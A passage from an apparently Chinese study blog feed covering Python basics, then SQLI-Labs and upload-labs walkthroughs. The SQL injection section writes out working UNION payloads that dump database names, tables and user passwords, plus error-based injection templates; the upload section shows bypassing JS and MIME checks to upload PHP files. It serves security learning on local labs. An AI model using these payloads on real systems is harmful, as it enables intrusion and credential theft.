<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>tup1 = (<span class="number">50</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(tup1)   <span class="comment"># 不加逗号，类型为整型</span></span><br><span class="line">&lt;**<span class="class"><span class="keyword">class</span>** &#x27;<span class="title">int</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line">&gt;&gt;&gt; tup1 = (50,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(tup1)   <span class="comment"># 加上逗号，类型为元组</span></span><br><span class="line">&lt;**<span class="class"><span class="keyword">class</span>** &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="2-可变数据"><a href="#2-可变数据" class="headerlink" title="2.可变数据"></a>2.可变数据</h2><h3 id="4-List（列表）"><a href="#4-List（列表）" class="headerlink" title="4.List（列表）"></a>4.List（列表）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;white&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>索引值和String类型一样</p>
<h3 id="5-Set（集合）"><a href="#5-Set（集合）" class="headerlink" title="5.Set（集合）"></a>5.Set（集合）</h3><p>集合是无序的不重复的元素序列</p>
<p>可以使用{}或set()函数创建集合，<strong>创建空集合必须用set()而不是{}，因为{}用来创建空字典</strong></p>
<p>parame = {1, 2, 3, 4, 5}</p>
<p>或</p>
<p>set(1, 2, 3, 4, 5)</p>
<h3 id="6-Dictionary（字典）"><a href="#6-Dictionary（字典）" class="headerlink" title="6.Dictionary（字典）"></a>6.Dictionary（字典）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;runoob&#x27;</span>, <span class="string">&#x27;likes&#x27;</span>: <span class="number">123</span>, <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;www.runoob.com&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://www.runoob.com/wp-content/uploads/2016/04/py-dict-2.png" alt=""></p>
<h1 id="Python的条件控制"><a href="#Python的条件控制" class="headerlink" title="Python的条件控制"></a>Python的条件控制</h1><h2 id="1-基本格式"><a href="#1-基本格式" class="headerlink" title="1.基本格式"></a>1.基本格式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入你家狗狗的年龄: &quot;</span>))</span><br><span class="line">print(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> age &lt;= <span class="number">0</span>:</span><br><span class="line">    print(<span class="string">&quot;你是在逗我吧!&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> age == <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">&quot;相当于 14 岁的人。&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> age == <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">&quot;相当于 22 岁的人。&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> age &gt; <span class="number">2</span>:</span><br><span class="line">    human = <span class="number">22</span> + (age <span class="number">-2</span>)*<span class="number">5</span></span><br><span class="line">    print(<span class="string">&quot;对应人类年龄: &quot;</span>, human)</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 退出提示</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;点击 enter 键退出&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="2-if嵌套"><a href="#2-if嵌套" class="headerlink" title="2.if嵌套"></a>2.if嵌套</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入一个数字：&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> num%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> num%<span class="number">3</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;你输入的数字可以整除 2 和 3&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;你输入的数字可以整除 2，但不能整除 3&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> num%<span class="number">3</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;你输入的数字可以整除 3，但不能整除 2&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>  (<span class="string">&quot;你输入的数字不能整除 2 和 3&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入一个数字：<span class="number">6</span></span><br><span class="line">你输入的数字可以整除 <span class="number">2</span> 和 <span class="number">3</span></span><br></pre></td></tr></table></figure>
<h1 id="Python的循环语句"><a href="#Python的循环语句" class="headerlink" title="Python的循环语句"></a>Python的循环语句</h1><h2 id="1-while循环"><a href="#1-while循环" class="headerlink" title="1.while循环"></a>1.while循环</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">counter = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> counter &lt;= n:</span><br><span class="line">    <span class="built_in">sum</span> += counter</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line">print(<span class="string">&quot;1到%d的总和：%d&quot;</span> % (n, <span class="built_in">sum</span>))  </span><br></pre></td></tr></table></figure>
<h2 id="2-while循环使用else语句"><a href="#2-while循环使用else语句" class="headerlink" title="2.while循环使用else语句"></a>2.while循环使用else语句</h2><p>条件语句为false时，执行else语句块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">   <span class="built_in">print</span> (count, <span class="string">&quot; 小于 5&quot;</span>)</span><br><span class="line">   count = count + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> (count, <span class="string">&quot; 大于或等于 5&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="3-for循环"><a href="#3-for循环" class="headerlink" title="3.for循环"></a>3.for循环</h2><h3 id="1-一般遍历"><a href="#1-一般遍历" class="headerlink" title="1.一般遍历"></a>1.一般遍历</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sites = [<span class="string">&quot;Baidu&quot;</span>, <span class="string">&quot;Google&quot;</span>,<span class="string">&quot;Runoob&quot;</span>,<span class="string">&quot;Taobao&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> site <span class="keyword">in</span> sites:</span><br><span class="line">    <span class="keyword">if</span> site == <span class="string">&quot;Runoob&quot;</span>:</span><br><span class="line">        print(<span class="string">&quot;菜鸟教程!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;循环数据 &quot;</span> + site)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;没有循环数据!&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;完成循环!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>执行脚本后，在循环到“Runoob”时跳出循环体：</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">循环数据 Baidu</span><br><span class="line">循环数据 Google</span><br><span class="line">菜鸟教程!</span><br><span class="line">完成循环!</span><br></pre></td></tr></table></figure>
<h3 id="2-range-函数遍历"><a href="#2-range-函数遍历" class="headerlink" title="2.range()函数遍历"></a>2.range()函数遍历</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">9</span>) :</span><br><span class="line">    print(i)</span><br><span class="line">    </span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">9</span></span><br></pre></td></tr></table></figure>
<h3 id="3-range-和len-遍历一个序列的索引"><a href="#3-range-和len-遍历一个序列的索引" class="headerlink" title="3.range()和len()遍历一个序列的索引"></a>3.range()和len()遍历一个序列的索引</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a = [<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Baidu&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Taobao&#x27;</span>, <span class="string">&#x27;QQ&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line"><span class="meta">... </span>    print(i, a[i])</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="number">0</span> Google</span><br><span class="line"><span class="number">1</span> Baidu</span><br><span class="line"><span class="number">2</span> Runoob</span><br><span class="line"><span class="number">3</span> Taobao</span><br><span class="line"><span class="number">4</span> QQ</span><br></pre></td></tr></table></figure>
<h3 id="4-range-函数创建一个列表"><a href="#4-range-函数创建一个列表" class="headerlink" title="4.range()函数创建一个列表"></a>4.range()函数创建一个列表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">5</span>))</span><br></pre></td></tr></table></figure>
<p>[0, 1, 2, 3, 4]</p>
<h2 id="4-break和continue"><a href="#4-break和continue" class="headerlink" title="4.break和continue"></a>4.break和continue</h2><p>break是跳出这次循环</p>
<p>continue是跳过这次循环</p>
]]></content>
      <categories>
        <category>网络安全知识学习</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入学习</title>
    <url>/post/6d789c72.html</url>
    <content><![CDATA[<p>　　这个漏洞以后再写项目的时候必须注意<span id="more"></span></p>
<h1 id="SQLI-Labs简介"><a href="#SQLI-Labs简介" class="headerlink" title="SQLI-Labs简介"></a>SQLI-Labs简介</h1><h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>　　通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
<h2 id="2-sql注入类型"><a href="#2-sql注入类型" class="headerlink" title="2.sql注入类型"></a>2.sql注入类型</h2><p>按照注入点类型来分类</p>
<h3 id="（1）数字型注入点"><a href="#（1）数字型注入点" class="headerlink" title="（1）数字型注入点"></a>（1）数字型注入点</h3><p>sql语句为<code>select * from table_name where id = x</code></p>
<p>这种类型可以使用and 1=1 和 and 1=2判断：</p>
<p>​        1.url地址中输入id=x and 1=1页面正常回显</p>
<p>​        2.url地址中输入id=x and 1=2页面回显不正常，则属于该类型</p>
<p>原因：</p>
<p>当输入and 1=1时，执行的sql语句：<code>selece * from table_name where id=x and 1=1</code>，没有逻辑错误，返回正常</p>
<p>当输入and 1=2时，执行的sql语句：<code>selece * from table_name where id=x and 1=2</code></p>
<p>如果是字符型注入，则应该是以下情况</p>
<p>1）<code>selece * from table_name where &#39;id=x and 1=1&#39;</code></p>
<p>2）<code>selece * from table_name where &#39;id=x and 1=2&#39;</code></p>
<p>引号里面的被转换为字符串，没有进行逻辑判断，不会出现上述结果，所以这种情况不成立。</p>
<h3 id="（2）字符型注入点"><a href="#（2）字符型注入点" class="headerlink" title="（2）字符型注入点"></a>（2）字符型注入点</h3><p>　　当输入的参数x为字符型时，执行的sql语句：<code>select * from table_name where id=&#39;x&#39;</code></p>
<p>同样可以用and ‘1’=’1和and ‘1’=’2判断：</p>
<p>​        1.url地址输入id=x’ and ‘1’=’1页面正常，继续下一步</p>
<p>​        2.url地址中继续输入id=x’ and ‘1’=’2页面错误，则为字符型注入</p>
<p>原因：</p>
<p>当输入id=x’ and ‘1’=’1时，执行的sql语句：<code>select * from table_name where id=&#39;x&#39; and &#39;1&#39;=&#39;1&#39;</code></p>
<p>语法正确，逻辑正确，所以返回正确</p>
<p>当输入and ‘1’=’2，执行的sql语句：<code>select * from table_name where id=&#39;x&#39; and &#39;1&#39;=&#39;2&#39;</code></p>
<p>语法正确，但是逻辑判断错误</p>
<h3 id="（3）搜索型注入点"><a href="#（3）搜索型注入点" class="headerlink" title="（3）搜索型注入点"></a>（3）搜索型注入点</h3><p>　　这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code>。</p>
<p>组合出来的sql注入语句为：<code>select * from news where search like &#39;%测试 %&#39; and &#39;%1%&#39;=&#39;%1%&#39;</code></p>
<p>测试%’ union select 1,2,3,4 and ‘%’=’</p>
<p>按照数据提交的方式来分类</p>
<p>（1）GET 注入</p>
<p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code> , id 是注入点。</p>
<p>（2）POST 注入</p>
<p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>
<p>（3）Cookie 注入</p>
<p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>
<p>（4）HTTP 头部注入</p>
<p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
<p>按照执行效果来分类</p>
<p>（1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</p>
<p>（2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
<p>（3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
<p>*（4）联合查询注入，可以使用union的情况下的注入。</p>
<p>*（5）堆查询注入，可以同时执行多条语句的执行时的注入。</p>
<h1 id="SQLI-LABS学习"><a href="#SQLI-LABS学习" class="headerlink" title="SQLI-LABS学习"></a>SQLI-LABS学习</h1><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>首先说一下我在学习过程中经常弄混淆的一些单词</p>
<p>table_schema：数据库名</p>
<p>information_schema.schemata：所有的数据库中</p>
<p>information_schema.tables：该数据库中的所有表</p>
<p>information_schema.column：该表中的所有列</p>
<p>table_name：表名</p>
<p>column_name：列名</p>
<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>— （这里有一个空格）在sql语句中表示注释，但是在url中，如果在最后一行加上— ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用—+代替，因为+在URL被编码后会变成空格。</p>
<p>1.输入<code>http://127.0.0.1/sqli/Less-1/?id=1</code>，页面回显正常，所以改地方不是数值查询。<br><img src="https://img-blog.csdnimg.cn/20201027175301124.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>
<p>2.在id后面加上’，页面回显不正常，可能存在字符注入<br><img src="https://img-blog.csdnimg.cn/20201027175440385.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>3.输入—+将sql后面的语句注释掉，页面回显正常，说明是单引号字符型注入<br><img src="https://img-blog.csdnimg.cn/20201027175502223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>4.接着使用order by语句判断该数据库有几列输入，order by 4、order by 5、order by 6···页面都回显错误，只有order by 3正常，说明该表有3列<br><img src="https://img-blog.csdnimg.cn/20201027175622660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>5.将id=1改成id=-1，然后使用union select 1,2,3联合查询语句查询是否有显示位。显示2和3，表明有2个显示位，说明第2列和第3列可以显示信息。<br><img src="https://img-blog.csdnimg.cn/20201027180119978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>6.然后利用sql查询语句爆破出数据库的库名，表名，列名，字段信息：<br>库名：<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code><br><img src="https://img-blog.csdnimg.cn/20201027182524974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>表名：<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code><br>这里0x7365637572697479是查询的库名security的16进制<br><img src="https://img-blog.csdnimg.cn/20201027182008418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>users表中的列名：<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code><br><img src="https://img-blog.csdnimg.cn/20201027182640634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>接着使用一下语句查询账号密码<br><code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users--+</code><br><img src="https://img-blog.csdnimg.cn/20201027182951559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>第二关和第一关是一个类型的</p>
<p>1.输入id=1回显正常</p>
<p>2.id=1’出错，可以见是单引号闭合出错</p>
<p>3.之后继续按照第一关的步骤进行爆破信息</p>
<h2 id="第三次"><a href="#第三次" class="headerlink" title="第三次"></a>第三次</h2><p>1.和之前一样输入</p>
<p><img src="https://s1.ax1x.com/2020/11/09/BHiUhV.png" alt="BHiUhV.png"></p>
<p>2.使id=1’—+</p>
<p><img src="https://s1.ax1x.com/2020/11/09/BHirnJ.png" alt="BHirnJ.png"></p>
<p>但是输入id=1’) —+页面回显正常，说明此处是字符型注入，而且以(‘’)的方式闭合字符串</p>
<p>3.接着使用order by判断表中有3列数据</p>
<p>4.使用联合查询union select 1,2,3判断是有回显位，回显位是2,3</p>
<p><img src="https://s1.ax1x.com/2020/11/09/BHiG0s.png" alt="BHiG0s.png"></p>
<p>5.爆出库名是security</p>
<p><img src="https://s1.ax1x.com/2020/11/09/BHitkq.png" alt="BHitkq.png"></p>
<p>列出security库中所有的表名</p>
<p><img src="https://s1.ax1x.com/2020/11/09/BHiJ7n.png" alt="BHiJ7n.png"></p>
<p>列出users表中所有的列名</p>
<p><img src="https://s1.ax1x.com/2020/11/09/BHidpT.png" alt="BHidpT.png"></p>
<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>与之前的都类似，先判断这一关是(“”)闭合异常</p>
<p>1.输入id=1，页面回显正常</p>
<p>2.输入id=1“—+，页面回显不正常</p>
<p><img src="https://s1.ax1x.com/2020/11/09/BHi0cF.png" alt="BHi0cF.png"></p>
<p>3.进行和第三关一样的步骤</p>
<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>这一关输入id=3时发现页面回显是you are in…</p>
<p>可见是布尔型注入，它并不能正常显示内容，正确回显只会显示you are in…，错误就不显示，所以无法用order by查看显示位</p>
<p>1.输入id=1</p>
<p><img src="https://s1.ax1x.com/2020/11/09/BHiBX4.png" alt="BHiBX4.png"></p>
<p>2.输入id=1‘</p>
<p><img src="https://s1.ax1x.com/2020/11/09/BHirnJ.png" alt="BHirnJ.png"></p>
<p>页面显示sql语句错误，在这里进行新的注入方式：报错注入</p>
<p>以下三种常用的语句：</p>
<p><strong>payload</strong>是我们要输入的sql查询语句</p>
<p>a.通过floor报错</p>
<p><code>and (select 1 from (select count(*),concat(( **payload**),floor (rand(0)*2))x from information_schema.tables group by x)a)</code></p>
<p>其中payload为你要插入的SQL语句</p>
<p>需要注意的是该语句将 输出字符长度限制为64个字符</p>
<p>b.通过updatexml报错</p>
<p>and updatexml(1, <strong>payload</strong>,1)</p>
<p>同样该语句对输出的字符长度也做了限制，其最长输出32位</p>
<p>并且该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
<p>c.通过ExtractValue报错</p>
<p>通过ExtractValue报错</p>
<p>and extractvalue(1, <strong>payload</strong>)</p>
<p>输出字符有长度限制，最长32位。</p>
]]></content>
      <categories>
        <category>网络安全知识学习</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/post/80f02bc5.html</url>
    <content><![CDATA[<p>　　BBUCTF的upload-labs关卡<span id="more"></span></p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>下图为upload-labs的上传漏洞分类</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DEhkS1.png" alt="DEhkS1.png" style="zoom:67%;" /></p>
<h1 id="PASS-01（JS检查）"><a href="#PASS-01（JS检查）" class="headerlink" title="PASS-01（JS检查）"></a>PASS-01（JS检查）</h1><h2 id="1-分析"><a href="#1-分析" class="headerlink" title="1.分析"></a>1.分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>选择php文件之后，上传显示</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DETazd.jpg" alt="DETazd.jpg"></p>
<p>数据还没有发送，就开始检测，说明是客户端检测</p>
<h2 id="2-绕过思路"><a href="#2-绕过思路" class="headerlink" title="2.绕过思路"></a>2.绕过思路</h2><p>1.将php文件后缀名改为jpg</p>
<p>2.打开burpsuite-&gt;Proxy-&gt;intercept-&gt;Option，开启Remove all JavaScript</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DETwQA.jpg" alt="DETwQA.jpg" style="zoom:67%;" /></p>
<p>2.开始上传并使用burpsuite拦截</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DET0sI.jpg" alt="DET0sI.jpg" style="zoom:50%;" /></p>
<p>3.将文件后缀名改为php</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DETURH.jpg" alt="DETURH.jpg" style="zoom:67%;" /></p>
<h1 id="PASS-02（MIME验证）"><a href="#PASS-02（MIME验证）" class="headerlink" title="PASS-02（MIME验证）"></a>PASS-02（MIME验证）</h1><h2 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="1.分析"></a>1.分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中定义MIME类型为image/jpeg的才能上传</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h2 id="2-绕过思路-1"><a href="#2-绕过思路-1" class="headerlink" title="2.绕过思路"></a>2.绕过思路</h2><p>使用burpsuite修改content-type类型</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DEzGP1.jpg" alt="DEzGP1.jpg" style="zoom:67%;" /></p>
